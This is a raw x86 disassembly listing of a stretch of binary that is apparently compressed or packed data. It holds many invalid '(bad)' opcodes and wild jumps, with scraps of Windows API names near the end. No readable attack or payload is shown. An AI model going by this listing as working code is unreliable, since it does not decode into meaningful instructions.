1315d490:	8a a7 70 fa 3d 70    	mov    0x703dfa70(%edi),%ah
1315d496:	b7 a9                	mov    $0xa9,%bh
1315d498:	78 0d                	js     0x1315d4a7
1315d49a:	95                   	xchg   %eax,%ebp
1315d49b:	f7 24 af             	mull   (%edi,%ebp,4)
1315d49e:	55                   	push   %ebp
1315d49f:	47                   	inc    %edi
1315d4a0:	a2 e6 c4 b9 88       	mov    %al,0x88b9c4e6
1315d4a5:	d7                   	xlat   %ds:(%ebx)
1315d4a6:	65 5c                	gs pop %esp
1315d4a8:	54                   	push   %esp
1315d4a9:	3f                   	aas
1315d4aa:	a2 5e 17 9f 61       	mov    %al,0x619f175e
1315d4af:	fb                   	sti
1315d4b0:	ff                   	(bad)
1315d4b1:	ff 61 45             	jmp    *0x45(%ecx)
1315d4b4:	b1 be                	mov    $0xbe,%cl
1315d4b6:	6a b1                	push   $0xffffffb1
1315d4b8:	ee                   	out    %al,(%dx)
1315d4b9:	53                   	push   %ebx
1315d4ba:	52                   	push   %edx
1315d4bb:	9b                   	fwait
1315d4bc:	67 07                	addr16 pop %es
1315d4be:	d5 0c                	aad    $0xc
1315d4c0:	95                   	xchg   %eax,%ebp
1315d4c1:	bd 75 c4 7a ff       	mov    $0xff7ac475,%ebp
1315d4c6:	29 68 e3             	sub    %ebp,-0x1d(%eax)
1315d4c9:	17                   	pop    %ss
1315d4ca:	ff                   	(bad)
1315d4cb:	ff                   	(bad)
1315d4cc:	ff                   	(bad)
1315d4cd:	7f 5a                	jg     0x1315d529
1315d4cf:	d7                   	xlat   %ds:(%ebx)
1315d4d0:	ab                   	stos   %eax,%es:(%edi)
1315d4d1:	90                   	nop
1315d4d2:	92                   	xchg   %eax,%edx
1315d4d3:	31 f8                	xor    %edi,%eax
1315d4d5:	92                   	xchg   %eax,%edx
1315d4d6:	84 af 61 6f 88 1c    	test   %ch,0x1c886f61(%edi)
1315d4dc:	4b                   	dec    %ebx
1315d4dd:	94                   	xchg   %eax,%esp
1315d4de:	32 ec                	xor    %ah,%ch
1315d4e0:	9f                   	lahf
1315d4e1:	2a 50 b2             	sub    -0x4e(%eax),%dl
1315d4e4:	89 f2                	mov    %esi,%edx
1315d4e6:	37                   	aaa
1315d4e7:	f9                   	stc
1315d4e8:	98                   	cwtl
1315d4e9:	fe                   	(bad)
1315d4ea:	ef                   	out    %eax,(%dx)
1315d4eb:	ca ff ff             	lret   $0xffff
1315d4ee:	7f e3                	jg     0x1315d4d3
1315d4f0:	95                   	xchg   %eax,%ebp
1315d4f1:	80 d9 0d             	sbb    $0xd,%cl
1315d4f4:	22 6b a3             	and    -0x5d(%ebx),%ch
1315d4f7:	2c 69                	sub    $0x69,%al
1315d4f9:	c2 6b 23             	ret    $0x236b
1315d4fc:	9c                   	pushf
1315d4fd:	03 53 2b             	add    0x2b(%ebx),%edx
1315d500:	0b 38                	or     (%eax),%edi
1315d502:	e0 ee                	loopne 0x1315d4f2
1315d504:	ed                   	in     (%dx),%eax
1315d505:	0b 66 f5             	or     -0xb(%esi),%esp
1315d508:	78 98                	js     0x1315d4a2
1315d50a:	ff                   	(bad)
1315d50b:	ff                   	(bad)
1315d50c:	ff                   	(bad)
1315d50d:	ff 9e f2 53 f3 a3    	lcall  *-0x5c0cac0e(%esi)
1315d513:	6b 94 6a c6 18 49 ed 	imul   $0xffffffc3,-0x12b6e73a(%edx,%ebp,2),%edx
1315d51a:	c3 
1315d51b:	78 f4                	js     0x1315d511
1315d51d:	bc 7e 9d d3 4c       	mov    $0x4cd39d7e,%esp
1315d522:	7a 9e                	jp     0x1315d4c2
1315d524:	dc 9a 54 9b d1 e9    	fcompl -0x162e64ac(%edx)
1315d52a:	d4 48                	aam    $0x48
1315d52c:	4b                   	dec    %ebx
1315d52d:	20 ff                	and    %bh,%bh
1315d52f:	ff                   	(bad)
1315d530:	ff                   	(bad)
1315d531:	ff                   	ljmp   (bad)
1315d532:	e8 5a aa 7d 71       	call   0x84937f91
1315d537:	fa                   	cli
1315d538:	32 39                	xor    (%ecx),%bh
1315d53a:	1e                   	push   %ds
1315d53b:	d3 60 15             	shll   %cl,0x15(%eax)
1315d53e:	23 42 e2             	and    -0x1e(%edx),%eax
1315d541:	5b                   	pop    %ebx
1315d542:	79 1e                	jns    0x1315d562
1315d544:	60                   	pusha
1315d545:	ea d7 8c 50 5c c2 3d 	ljmp   $0x3dc2,$0x5c508cd7
1315d54c:	28 75 52             	sub    %dh,0x52(%ebp)
1315d54f:	02 b1 cb ff ff ff    	add    -0x35(%ecx),%dh
1315d555:	ff 77 04             	push   0x4(%edi)
1315d558:	c5 06                	lds    (%esi),%eax
1315d55a:	0c 62                	or     $0x62,%al
1315d55c:	d3 f2                	shl    %cl,%edx
1315d55e:	b6 ed                	mov    $0xed,%dh
1315d560:	09 00                	or     %eax,(%eax)
1315d562:	a3 ef fa 76 f7       	mov    %eax,0xf776faef
1315d567:	ec                   	in     (%dx),%al
1315d568:	b4 f2                	mov    $0xf2,%ah
1315d56a:	d2 d3                	rcl    %cl,%bl
1315d56c:	7e 7e                	jle    0x1315d5ec
1315d56e:	86 a0 c4 03 19 bc    	xchg   %ah,-0x43e6fc3c(%eax)
1315d574:	ba e0 ff ff ff       	mov    $0xffffffe0,%edx
1315d579:	ff c0                	inc    %eax
1315d57b:	e2 a2                	loop   0x1315d51f
1315d57d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315d57e:	fc                   	cld
1315d57f:	27                   	daa
1315d580:	ab                   	stos   %eax,%es:(%edi)
1315d581:	33 9d e7 45 91 91    	xor    -0x6e6eba19(%ebp),%ebx
1315d587:	9f                   	lahf
1315d588:	81 2a 2c 49 f0 49    	subl   $0x49f0492c,(%edx)
1315d58e:	6f                   	outsl  %ds:(%esi),(%dx)
1315d58f:	78 b8                	js     0x1315d549
1315d591:	3f                   	aas
1315d592:	f5                   	cmc
1315d593:	e9 a5 36 70 d5       	jmp    0xe8860c3d
1315d598:	da 17                	ficoml (%edi)
1315d59a:	5b                   	pop    %ebx
1315d59b:	ff                   	(bad)
1315d59c:	ff                   	(bad)
1315d59d:	ff 4f c0             	decl   -0x40(%edi)
1315d5a0:	b9 9e 0a 0e ec       	mov    $0xec0e0a9e,%ecx
1315d5a5:	ef                   	out    %eax,(%dx)
1315d5a6:	b2 8d                	mov    $0x8d,%dl
1315d5a8:	66 ab                	stos   %ax,%es:(%edi)
1315d5aa:	20 79 0e             	and    %bh,0xe(%ecx)
1315d5ad:	ff 75 7f             	push   0x7f(%ebp)
1315d5b0:	08 bd 54 16 1f aa    	or     %bh,-0x55e0e9ac(%ebp)
1315d5b6:	ca 67 ff             	lret   $0xff67
1315d5b9:	ff                   	(bad)
1315d5ba:	ff                   	(bad)
1315d5bb:	ff 64 33 17          	jmp    *0x17(%ebx,%esi,1)
1315d5bf:	2c f0                	sub    $0xf0,%al
1315d5c1:	ca 68 93             	lret   $0x9368
1315d5c4:	c2 47 94             	ret    $0x9447
1315d5c7:	8e 8e ca 23 3e 1e    	mov    0x1e3e23ca(%esi),%cs
1315d5cd:	87 a1 9c ac ea 38    	xchg   %esp,0x38eaac9c(%ecx)
1315d5d3:	78 b6                	js     0x1315d58b
1315d5d5:	cb                   	lret
1315d5d6:	da 51 4e             	ficoml 0x4e(%ecx)
1315d5d9:	ec                   	in     (%dx),%al
1315d5da:	ac                   	lods   %ds:(%esi),%al
1315d5db:	c2 7f e3             	ret    $0xe37f
1315d5de:	ff d6                	call   *%esi
1315d5e0:	63 f9                	arpl   %edi,%ecx
1315d5e2:	65 7c ab             	gs jl  0x1315d590
1315d5e5:	46                   	inc    %esi
1315d5e6:	b2 56                	mov    $0x56,%dl
1315d5e8:	f9                   	stc
1315d5e9:	9a 3a 64 59 8e 6f 1b 	lcall  $0x1b6f,$0x8e59643a
1315d5f0:	08 a0 01 e0 ff ff    	or     %ah,-0x1fff(%eax)
1315d5f6:	ff                   	(bad)
1315d5f7:	ff 2d 91 9a 02 81    	ljmp   *0x81029a91
1315d5fd:	b9 ee df fe 5d       	mov    $0x5dfedfee,%ecx
1315d602:	4e                   	dec    %esi
1315d603:	64 88 09             	mov    %cl,%fs:(%ecx)
1315d606:	ca cf 73             	lret   $0x73cf
1315d609:	18 c9                	sbb    %cl,%cl
1315d60b:	3a 37                	cmp    (%edi),%dh
1315d60d:	fc                   	cld
1315d60e:	68 68 54 d4 f6       	push   $0xf6d45468
1315d613:	a2 72 f8 42 a1       	mov    %al,0xa142f872
1315d618:	ff                   	(bad)
1315d619:	ff 5f e0             	lcall  *-0x20(%edi)
1315d61c:	63 64 0a 2d          	arpl   %esp,0x2d(%edx,%ecx,1)
1315d620:	66 83 12 79          	adcw   $0x79,(%edx)
1315d624:	97                   	xchg   %eax,%edi
1315d625:	81 30 52 35 3f dc    	xorl   $0xdc3f3552,(%eax)
1315d62b:	e6 e1                	out    %al,$0xe1
1315d62d:	e4 96                	in     $0x96,%al
1315d62f:	e2 f2                	loop   0x1315d623
1315d631:	c9                   	leave
1315d632:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315d633:	24 ff                	and    $0xff,%al
1315d635:	ff                   	(bad)
1315d636:	ff                   	(bad)
1315d637:	ff 8e 59 9b da 55    	decl   0x55da9b59(%esi)
1315d63d:	0b ba d6 0f 59 1f    	or     0x1f590fd6(%edx),%edi
1315d643:	fc                   	cld
1315d644:	f9                   	stc
1315d645:	b8 bb 95 8e 1f       	mov    $0x1f8e95bb,%eax
1315d64a:	0a 0a                	or     (%edx),%cl
1315d64c:	f0 24 ca             	lock and $0xca,%al
1315d64f:	03 c4                	add    %esp,%eax
1315d651:	08 33                	or     %dh,(%ebx)
1315d653:	d0 8b ac c8 f5 fc    	rorb   $1,-0x30a3754(%ebx)
1315d659:	ff                   	(bad)
1315d65a:	ff                   	(bad)
1315d65b:	ff a0 83 f5 5b 0c    	jmp    *0xc5bf583(%eax)
1315d661:	13 55 97             	adc    -0x69(%ebp),%edx
1315d664:	72 f0                	jb     0x1315d656
1315d666:	41                   	inc    %ecx
1315d667:	c6                   	(bad)
1315d668:	ef                   	out    %eax,(%dx)
1315d669:	34 1f                	xor    $0x1f,%al
1315d66b:	5c                   	pop    %esp
1315d66c:	5b                   	pop    %ebx
1315d66d:	73 ae                	jae    0x1315d61d
1315d66f:	10 97 4b 82 5e 53    	adc    %dl,0x535e824b(%edi)
1315d675:	68 bd cb 2c 34       	push   $0x342ccbbd
1315d67a:	ff                   	(bad)
1315d67b:	ff                   	(bad)
1315d67c:	ff 2f                	ljmp   *(%edi)
1315d67e:	49                   	dec    %ecx
1315d67f:	e4 80                	in     $0x80,%al
1315d681:	03 07                	add    (%edi),%eax
1315d683:	b2 f8                	mov    $0xf8,%dl
1315d685:	67 ab                	stos   %eax,%es:(%di)
1315d687:	64 1b bf ac d6 47 7b 	sbb    %fs:0x7b47d6ac(%edi),%edi
1315d68e:	74 f3                	je     0x1315d683
1315d690:	26 5e                	es pop %esi
1315d692:	9a aa d6 9e 87 10 87 	lcall  $0x8710,$0x879ed6aa
1315d699:	44                   	inc    %esp
1315d69a:	ff                   	(bad)
1315d69b:	ff                   	(bad)
1315d69c:	ff                   	(bad)
1315d69d:	ff 21                	jmp    *(%ecx)
1315d69f:	01 52 df             	add    %edx,-0x21(%edx)
1315d6a2:	e6 32                	out    %al,$0x32
1315d6a4:	1a 88 cc 40 e9 78    	sbb    0x78e940cc(%eax),%cl
1315d6aa:	2b 64 51 05          	sub    0x5(%ecx,%edx,2),%esp
1315d6ae:	8d 6c 77 d5          	lea    -0x2b(%edi,%esi,2),%ebp
1315d6b2:	24 81                	and    $0x81,%al
1315d6b4:	1c 02                	sbb    $0x2,%al
1315d6b6:	31 13                	xor    %edx,(%ebx)
1315d6b8:	50                   	push   %eax
1315d6b9:	74 e4                	je     0x1315d69f
1315d6bb:	a1 db 2d ff ff       	mov    0xffff2ddb,%eax
1315d6c0:	ff 6f ba             	ljmp   *-0x46(%edi)
1315d6c3:	91                   	xchg   %eax,%ecx
1315d6c4:	0c ea                	or     $0xea,%al
1315d6c6:	3d 66 dd 7b 48       	cmp    $0x487bdd66,%eax
1315d6cb:	43                   	inc    %ebx
1315d6cc:	e5 02                	in     $0x2,%eax
1315d6ce:	b0 39                	mov    $0x39,%al
1315d6d0:	05 ff 87 4c aa       	add    $0xaa4c87ff,%eax
1315d6d5:	4a                   	dec    %edx
1315d6d6:	8e 69 1c             	mov    0x1c(%ecx),%gs
1315d6d9:	b4 33                	mov    $0x33,%ah
1315d6db:	31 8a 6b ff ff ff    	xor    %ecx,-0x95(%edx)
1315d6e1:	ff cf                	dec    %edi
1315d6e3:	e3 b8                	jecxz  0x1315d69d
1315d6e5:	87 d1                	xchg   %edx,%ecx
1315d6e7:	59                   	pop    %ecx
1315d6e8:	1b 72 9c             	sbb    -0x64(%edx),%esi
1315d6eb:	4b                   	dec    %ebx
1315d6ec:	0d 7b 0e be f4       	or     $0xf4be0e7b,%eax
1315d6f1:	72 7a                	jb     0x1315d76d
1315d6f3:	de b2 ba 8f bb c6    	fidivs -0x39447046(%edx)
1315d6f9:	b2 66                	mov    $0x66,%dl
1315d6fb:	24 5d                	and    $0x5d,%al
1315d6fd:	d2 97 5d 0c 4c ff    	rclb   %cl,-0xb3f3a3(%edi)
1315d703:	7f eb                	jg     0x1315d6f0
1315d705:	ff 07                	incl   (%edi)
1315d707:	c8 bc 96 38          	enter  $0x96bc,$0x38
1315d70b:	83 56 73 a7          	adcl   $0xffffffa7,0x73(%esi)
1315d70f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315d710:	e8 90 bd 80 36       	call   0x499694a5
1315d715:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315d716:	5e                   	pop    %esi
1315d717:	80 93 18 f0 f0 8e 06 	adcb   $0x6,-0x710f0fe8(%ebx)
1315d71e:	99                   	cltd
1315d71f:	7c ff                	jl     0x1315d720
1315d721:	ff                   	(bad)
1315d722:	ff                   	(bad)
1315d723:	ff d5                	call   *%ebp
1315d725:	ff                   	(bad)
1315d726:	b8 18 7a d9 2b       	mov    $0x2bd97a18,%eax
1315d72b:	d0 03                	rolb   $1,(%ebx)
1315d72d:	dd 70 c2             	fnsave -0x3e(%eax)
1315d730:	69 f5 ec 79 7c 41    	imul   $0x417c79ec,%ebp,%esi
1315d736:	77 a7                	ja     0x1315d6df
1315d738:	22 24 c9             	and    (%ecx,%ecx,8),%ah
1315d73b:	63 03                	arpl   %eax,(%ebx)
1315d73d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315d73e:	a3 a3 c6 1d bc       	mov    %eax,0xbc1dc6a3
1315d743:	af                   	scas   %es:(%edi),%eax
1315d744:	ff                   	(bad)
1315d745:	ff                   	(bad)
1315d746:	ff                   	(bad)
1315d747:	ff                   	ljmp   (bad)
1315d748:	e9 9b 3b 80 a3       	jmp    0xb69612e8
1315d74d:	3a 41 55             	cmp    0x55(%ecx),%al
1315d750:	da 38                	fidivrl (%eax)
1315d752:	2f                   	das
1315d753:	0b 1e                	or     (%esi),%ebx
1315d755:	f1                   	int1
1315d756:	09 f0                	or     %esi,%eax
1315d758:	37                   	aaa
1315d759:	ca db db             	lret   $0xdbdb
1315d75c:	43                   	inc    %ebx
1315d75d:	74 ba                	je     0x1315d719
1315d75f:	3e 6a f2             	ds push $0xfffffff2
1315d762:	2a f1                	sub    %cl,%dh
1315d764:	2b b8 64 bf ff 6f    	sub    0x6fffbf64(%eax),%edi
1315d76a:	fc                   	cld
1315d76b:	ff f7                	push   %edi
1315d76d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315d76e:	80 4a 18 59          	orb    $0x59,0x18(%edx)
1315d772:	65 34 03             	gs xor $0x3,%al
1315d775:	96                   	xchg   %eax,%esi
1315d776:	39 84 2a 36 61 35 9a 	cmp    %eax,-0x65ca9eca(%edx,%ebp,1)
1315d77d:	65 ab                	gs stos %eax,%es:(%edi)
1315d77f:	c8 7a 9f 65          	enter  $0x9f7a,$0x65
1315d783:	6b 55 2f ff          	imul   $0xffffffff,0x2f(%ebp),%edx
1315d787:	ff                   	(bad)
1315d788:	ff                   	(bad)
1315d789:	ff 56 7c             	call   *0x7c(%esi)
1315d78c:	28 59 bc             	sub    %bl,-0x44(%ecx)
1315d78f:	9a c9 52 50 c8 a2 69 	lcall  $0x69a2,$0xc85052c9
1315d796:	88 04 74             	mov    %al,(%esp,%esi,2)
1315d799:	20 92 49 20 3f d6    	and    %dl,-0x29c0dfb7(%edx)
1315d79f:	d1 1a                	rcrl   $1,(%edx)
1315d7a1:	60                   	pusha
1315d7a2:	b8 94 3d a4 0f       	mov    $0xfa43d94,%eax
1315d7a7:	93                   	xchg   %eax,%ebx
1315d7a8:	4b                   	dec    %ebx
1315d7a9:	1a 05 fe 4b ff e2    	sbb    0xe2ff4bfe,%al
1315d7af:	9c                   	pushf
1315d7b0:	85 34 46             	test   %esi,(%esi,%eax,2)
1315d7b3:	fa                   	cli
1315d7b4:	23 44 42 eb          	and    -0x15(%edx,%eax,2),%eax
1315d7b8:	60                   	pusha
1315d7b9:	e8 fb e9 ce f8       	call   0xbe4c1b9
1315d7be:	79 9c                	jns    0x1315d75c
1315d7c0:	01 54 58 fd          	add    %edx,-0x3(%eax,%ebx,2)
1315d7c4:	3e 46                	ds inc %esi
1315d7c6:	bb ff 27 58 a1       	mov    $0xa15827ff,%ebx
1315d7cb:	f2 02 22             	repnz add (%edx),%ah
1315d7ce:	6c                   	insb   (%dx),%es:(%edi)
1315d7cf:	04 24                	add    $0x24,%al
1315d7d1:	01 e0                	add    %esp,%eax
1315d7d3:	b7 ff                	mov    $0xff,%bh
1315d7d5:	e5 4c                	in     $0x4c,%eax
1315d7d7:	62 01                	bound  %eax,(%ecx)
1315d7d9:	6c                   	insb   (%dx),%es:(%edi)
1315d7da:	73 74                	jae    0x1315d850
1315d7dc:	72 6c                	jb     0x1315d84a
1315d7de:	65 6e                	outsb  %gs:(%esi),(%dx)
1315d7e0:	57                   	push   %edi
1315d7e1:	09 57 72             	or     %edx,0x72(%edi)
1315d7e4:	69 74 65 b5 83 fd 33 	imul   $0x5733fd83,-0x4b(%ebp,%eiz,2),%esi
1315d7eb:	57 
1315d7ec:	4d                   	dec    %ebp
1315d7ed:	65 6d                	gs insl (%dx),%es:(%edi)
1315d7ef:	6f                   	outsl  %ds:(%esi),(%dx)
1315d7f0:	72 79                	jb     0x1315d86b
1315d7f2:	13 46 69             	adc    0x69(%esi),%eax
1315d7f5:	20 ad 01 db d2 0a    	and    %ch,0xad2db01(%ebp)
1315d7fb:	61                   	popa
1315d7fc:	46                   	inc    %esi
1315d7fd:	14 53                	adc    $0x53,%al
1315d7ff:	bd 0e ba 7f 73       	mov    $0x737fba0e,%ebp
1315d804:	c0 4f 62 84          	rorb   $0x84,0x62(%edi)
1315d808:	14 56                	adc    $0x56,%al
1315d80a:	69 72 74 75 61 6c 35 	imul   $0x356c6175,0x74(%edx),%esi
1315d811:	74 85                	je     0x1315d798
1315d813:	ec                   	in     (%dx),%al
1315d814:	93                   	xchg   %eax,%ebx
1315d815:	ed                   	in     (%dx),%eax
1315d816:	0f 45 78 11          	cmovne 0x11(%eax),%edi
1315d81a:	46                   	inc    %esi
1315d81b:	72 65                	jb     0x1315d882
1315d81d:	65 0e                	gs push %cs
1315d81f:	66 cb                	lretw
1315d821:	da 93 0c 41 6c 6c    	ficoml 0x6c6c410c(%ebx)
1315d827:	64 1c 0f             	fs sbb $0xf,%al
1315d82a:	76 bb                	jbe    0x1315d7e7
1315d82c:	6d                   	insl   (%dx),%es:(%edi)
1315d82d:	df 0d 54 65 72 6d    	fisttps 0x6d726554
1315d833:	5c                   	pop    %esp
1315d834:	61                   	popa
1315d835:	48                   	dec    %eax
1315d836:	54                   	push   %esp
1315d837:	68 2d 61 64 10       	push   $0x1064612d
1315d83c:	ee                   	out    %al,(%dx)
1315d83d:	b6 0d                	mov    $0xd,%dh
1315d83f:	5b                   	pop    %ebx
1315d840:	94                   	xchg   %eax,%esp
1315d841:	11 53 79             	adc    %edx,0x79(%ebx)
1315d844:	65 70 06             	gs jo  0x1315d84d
1315d847:	d9 ae bd fd 69 7a    	fldcw  0x7a69fdbd(%esi)
1315d84d:	65 6f                	outsl  %gs:(%esi),(%dx)
1315d84f:	66 52                	push   %dx
1315d851:	12 6f 75             	adc    0x75(%edi),%ch
1315d854:	72 18                	jb     0x1315d86e
1315d856:	0f 65 74 33 82       	pcmpgtw -0x7e(%ebx,%esi,1),%mm6
1315d85b:	80 75 b7 28          	xorb   $0x28,-0x49(%ebp)
1315d85f:	69 6f b1 79 12 dd 5f 	imul   $0x5fdd1279,-0x4f(%edi),%ebp
1315d866:	ec                   	in     (%dx),%al
1315d867:	56                   	push   %esi
1315d868:	a8 40                	test   $0x40,%al
1315d86a:	78 74                	js     0x1315d8e0
1315d86c:	11 c8                	adc    %ecx,%eax
1315d86e:	50                   	push   %eax
1315d86f:	6f                   	outsl  %ds:(%esi),(%dx)
1315d870:	69 10 72 6e 97 e0    	imul   $0xe0976e72,(%eax),%edx
1315d876:	64 0f 41 74 90 62    	cmovno %fs:0x62(%eax,%edx,4),%esi
1315d87c:	75 12                	jne    0x1315d890
1315d87e:	73 57                	jae    0x1315d8d7
1315d880:	f6 17                	notb   (%edi)
1315d882:	00 c4                	add    %al,%ah
1315d884:	13 bc 4d 6f 64 56 93 	adc    -0x6ca99b91(%ebp,%ecx,2),%edi
1315d88b:	ed                   	in     (%dx),%eax
1315d88c:	66 7f 45             	data16 jg 0x1315d8d4
1315d88f:	6e                   	outsb  %ds:(%esi),(%dx)
1315d890:	64 4f                	fs dec %edi
1315d892:	66 ff 6e 75          	ljmpw  *0x75(%esi)
1315d896:	6d                   	insl   (%dx),%es:(%edi)
1315d897:	9b                   	fwait
1315d898:	52                   	push   %edx
1315d899:	ce                   	into
1315d89a:	de 42 78             	fiadds 0x78(%edx)
1315d89d:	6d                   	insl   (%dx),%es:(%edi)
1315d89e:	2b 12                	sub    (%edx),%edx
1315d8a0:	2a 4c 0b b9          	sub    -0x47(%ebx,%ecx,1),%cl
1315d8a4:	2d db 17 6b 9d       	sub    $0x9d6b17db,%eax
1315d8a9:	0d 61 64 17 b6       	or     $0xb6176461,%eax
1315d8ae:	e5 b7                	in     $0xb7,%eax
1315d8b0:	4c                   	dec    %esp
1315d8b1:	70 72                	jo     0x1315d925
1315d8b3:	61                   	popa
1315d8b4:	72 79                	jb     0x1315d92f
1315d8b6:	41                   	inc    %ecx
1315d8b7:	47                   	inc    %edi
1315d8b8:	f9                   	stc
1315d8b9:	62 00                	bound  %eax,(%eax)
1315d8bb:	55                   	push   %ebp
1315d8bc:	6e                   	outsb  %ds:(%esi),(%dx)
1315d8bd:	1d f6 86 b9 6c       	sbb    $0x6cb986f6,%eax
1315d8c2:	31 0d dd 0b 4c 0a    	xor    %ecx,0xa4c0bdd
1315d8c8:	67 41                	addr16 inc %ecx
1315d8ca:	9b                   	fwait
1315d8cb:	17                   	pop    %ss
1315d8cc:	88 65 44             	mov    %ah,0x44(%ebp)
1315d8cf:	31 43 3b             	xor    %eax,0x3b(%ebx)
1315d8d2:	d6                   	salc
1315d8d3:	19 67 6e             	sbb    %esp,0x6e(%edi)
1315d8d6:	57                   	push   %edi
1315d8d7:	15 54 69 91 93       	adc    $0x93916954,%eax
1315d8dc:	bd 94 bd 42 6d       	mov    $0x6d42bd94,%ebp
1315d8e1:	23 0f                	and    (%edi),%ecx
1315d8e3:	f2 11 62 c1          	repnz adc %esp,-0x3f(%edx)
1315d8e7:	6c                   	insb   (%dx),%es:(%edi)
1315d8e8:	bb 9c 70 50 1e       	mov    $0x1e50709c,%ebx
1315d8ed:	68 1f dc d0 6e       	push   $0x6ed0dc1f
1315d8f2:	5d                   	pop    %ebp
1315d8f3:	c8 44 ec 75          	enter  $0xec44,$0x75
1315d8f7:	b5 48                	mov    $0x48,%ch
1315d8f9:	61                   	popa
1315d8fa:	60                   	pusha
1315d8fb:	59                   	pop    %ecx
1315d8fc:	fb                   	sti
1315d8fd:	05 cc 0d 11 cb       	add    $0xcb110dcc,%eax
1315d902:	4e                   	dec    %esi
1315d903:	61                   	popa
1315d904:	60                   	pusha
1315d905:	25 84 67 af b9       	and    $0xb9af6784,%eax
1315d90a:	89 8e 6f 0d 61 73    	mov    %ecx,0x73610d6f(%esi)
1315d910:	29 12                	sub    %edx,(%edx)
1315d912:	82 bd d8 0d 29 b5 54 	cmpb   $0x54,-0x4ad6f228(%ebp)
1315d919:	dd 12                	fstl   (%edx)
1315d91b:	f2 b7 a7             	repnz mov $0xa7,%bh
1315d91e:	44                   	inc    %esp
1315d91f:	61                   	popa
1315d920:	74 a1                	je     0x1315d8c3
1315d922:	6d                   	insl   (%dx),%es:(%edi)
1315d923:	6d                   	insl   (%dx),%es:(%edi)
1315d924:	4b                   	dec    %ebx
1315d925:	78 bc                	js     0x1315d8e3
1315d927:	d6                   	salc
1315d928:	6f                   	outsl  %ds:(%esi),(%dx)
1315d929:	4c                   	dec    %esp
1315d92a:	d4 5d                	aam    $0x5d
1315d92c:	1c 2e                	sbb    $0x2e,%al
1315d92e:	ef                   	out    %eax,(%dx)
1315d92f:	36 9b                	ss fwait
1315d931:	e4 46                	in     $0x46,%al
1315d933:	69 6e 57 0e 03 72 73 	imul   $0x7372030e,0x57(%esi),%ebp
1315d93a:	57                   	push   %edi
1315d93b:	34 dc                	xor    $0xdc,%al
1315d93d:	c2 61 0f             	ret    $0xf61
1315d940:	43                   	inc    %ebx
1315d941:	1b 73 29             	sbb    0x29(%ebx),%esi
1315d944:	42                   	inc    %edx
1315d945:	e6 da                	out    %al,$0xda
1315d947:	c9                   	leave
1315d948:	28 ea                	sub    %ch,%dl
1315d94a:	1a 44 65 1e          	sbb    0x1e(%ebp,%eiz,2),%al
1315d94e:	64 24 9c             	fs and $0x9c,%al
1315d951:	2d c3 70 43 06       	sub    $0x64370c3,%eax
1315d956:	47                   	inc    %edi
1315d957:	0d 52 b2 60 23       	or     $0x2360b252,%eax
1315d95c:	33 a6 13 3d 31 48    	xor    0x48313d13(%esi),%esp
1315d962:	58                   	pop    %eax
1315d963:	b2 6e                	mov    $0x6e,%dl
1315d965:	4d                   	dec    %ebp
1315d966:	b2 78                	mov    $0x78,%dl
1315d968:	0d 4c de b0 db       	or     $0xdbb0de4c,%eax
1315d96d:	40                   	inc    %eax
1315d96e:	34 be                	xor    $0xbe,%al
1315d970:	70 79                	jo     0x1315d9eb
1315d972:	1c 8a                	sbb    $0x8a,%al
1315d974:	e9 79 4a 13 3b       	jmp    0x4e2923f2
1315d979:	54                   	push   %esp
1315d97a:	1c 54                	sbb    $0x54,%al
1315d97c:	55                   	push   %ebp
1315d97d:	45                   	inc    %ebp
1315d97e:	a0 20 47 3c dc       	mov    0xdc3c4720,%al
1315d983:	98                   	cwtl
1315d984:	71 48                	jno    0x1315d9ce
1315d986:	f2 0c 47             	repnz or $0x47,%al
1315d989:	46                   	inc    %esi
1315d98a:	f0 1c f6             	lock sbb $0xf6,%al
1315d98d:	d9 4a 7b             	(bad) 0x7b(%edx)
1315d990:	40                   	inc    %eax
1315d991:	68 61 01 cd 43       	push   $0x43cd0161
1315d996:	ee                   	out    %al,(%dx)
1315d997:	11 cd                	adc    %ecx,%ebp
1315d999:	75 cb                	jne    0x1315d966
1315d99b:	69 2f 4b 57 3d b2    	imul   $0xb23d574b,(%edi),%ebp
1315d9a1:	c7                   	(bad)
1315d9a2:	95                   	xchg   %eax,%ebp
1315d9a3:	6d                   	insl   (%dx),%es:(%edi)
1315d9a4:	89 76 15             	mov    %esi,0x15(%esi)
1315d9a7:	45                   	inc    %ebp
1315d9a8:	d0 15 66 68 1d 91    	rclb   $1,0x911d6866
1315d9ae:	bc 69 0f 96 1a       	mov    $0x1a960f69,%esp
1315d9b3:	9b                   	fwait
1315d9b4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315d9b5:	90                   	nop
1315d9b6:	52                   	push   %edx
1315d9b7:	94                   	xchg   %eax,%esp
1315d9b8:	9f                   	lahf
1315d9b9:	18 ad 51 58 d9 aa    	sbb    %ch,-0x5526a7af(%ebp)
1315d9bf:	fb                   	sti
1315d9c0:	8a f8                	mov    %al,%bh
1315d9c2:	d8 16                	fcoms  (%esi)
1315d9c4:	5a                   	pop    %edx
1315d9c5:	c7                   	(bad)
1315d9c6:	75 6e                	jne    0x1315da36
1315d9c8:	57                   	push   %edi
1315d9c9:	51                   	push   %ecx
1315d9ca:	c9                   	leave
1315d9cb:	07                   	pop    %es
1315d9cc:	50                   	push   %eax
1315d9cd:	03 66 de             	add    -0x22(%esi),%esp
1315d9d0:	29 56 78             	sub    %edx,0x78(%esi)
1315d9d3:	d2 6e 41             	shrb   %cl,0x41(%esi)
1315d9d6:	16                   	push   %ss
1315d9d7:	53                   	push   %ebx
1315d9d8:	e7 5b                	out    %eax,$0x5b
1315d9da:	e1 10                	loope  0x1315d9ec
1315d9dc:	db 07                	fildl  (%edi)
1315d9de:	73 64                	jae    0x1315da44
1315d9e0:	e6 c3                	out    %al,$0xc3
1315d9e2:	49                   	dec    %ecx
1315d9e3:	6e                   	outsb  %ds:(%esi),(%dx)
1315d9e4:	a2 c8 30 18 95       	mov    %al,0x951830c8
1315d9e9:	49                   	dec    %ecx
1315d9ea:	75 dc                	jne    0x1315d9c8
1315d9ec:	5b                   	pop    %ebx
1315d9ed:	7b b0                	jnp    0x1315d99f
1315d9ef:	6f                   	outsl  %ds:(%esi),(%dx)
1315d9f0:	54                   	push   %esp
1315d9f1:	6f                   	outsl  %ds:(%esi),(%dx)
1315d9f2:	4d                   	dec    %ebp
